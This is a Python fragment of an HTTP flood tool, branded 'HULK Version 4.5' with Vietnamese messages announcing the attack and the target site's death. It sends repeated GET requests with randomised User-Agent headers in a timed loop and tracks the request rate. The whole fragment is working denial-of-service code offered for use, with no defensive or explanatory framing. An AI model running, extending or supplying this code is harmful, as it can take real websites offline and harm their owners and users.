def send_request(url):
    headers = {
        'User-Agent': random.choice(USER_AGENTS)
    }
    try:
        response = requests.get(url, headers=headers)
        status = response.status_code
        if status == 200:
            print('\033[1;33mHTTP-REQUESTS | Giakhiem đang tấn công | Status: 200  ')
        elif status == 500:
            print('\033[1;31mHTTP-REQUESTS | Giakhiem web đã die | Status: 500 ERROR WEBSITE SERVER IS DOWN ')
        else:
            print(f"Giakhiem-ATTACK | HULK Version 4.5 | Status: {status}")
    except requests.RequestException as e:
        print('\033[1;31mHTTP-REQUESTS | Giakhiem web đã die | Status: 500 ERROR WEBSITE SERVER IS DOWN  ')
        

def worker(url, duration, requests_per_milli):
    end_time = time.time() + duration
    while time.time() < end_time:
        start_time = time.time()
        for _ in range(requests_per_milli):
            send_request(url)
        elapsed_time = time.time() - start_time
        pps = requests_per_milli / elapsed_time
        update_title(int(pps), requests_per_milli)

